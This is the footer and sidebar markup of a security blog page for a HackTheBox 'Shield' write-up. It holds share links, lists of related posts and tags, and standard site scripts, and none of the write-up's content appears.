href="https://twitter.com/intent/tweet?text=HTB Shield Writeup - H41stur&url=https://h41stur.github.io/posts/htb-shield-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB Shield Writeup - H41stur&u=https://h41stur.github.io/posts/htb-shield-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB Shield Writeup - H41stur&url=https://h41stur.github.io/posts/htb-shield-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/htb-shield-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-archetype-writeup/"><div class="card-body"> <span class="timeago small" >Sep 5, 2021<i class="unloaded">2021-09-05T21:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Archetype Writeup</h3><div class="text-muted small"><p> Nome Archetype IP 10.10.10.27 Pontos 0 OS Windows Nível Very Easy ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-oopsie-writeup/"><div class="card-body"> <span class="timeago small" >Sep 5, 2021<i class="unloaded">2021-09-05T21:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Oopsie Writeup</h3><div class="text-muted small"><p> Nome Oopsie IP 10.10.10.28 Pontos 0 OS Linux Nível Very Easy RECON...</p></div></div></a></div><div class="card"> <a href="/posts/htb-pathfinder-writeup/"><div class="card-body"> <span class="timeago small" >Sep 6, 2021<i class="unloaded">2021-09-06T22:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Pathfinder Writeup</h3><div class="text-muted small"><p> Nome Pathfinder IP 10.10.10.30 Pontos 0 OS Windows Nível Very Easy ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-vaccine-writeup/" class="btn btn-outline-primary" prompt="Older"><p>HTB Vaccine Writeup</p></a> <a href="/posts/htb-pathfinder-writeup/" class="btn btn-outline-primary" prompt="Newer"><p>HTB Pathfinder Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
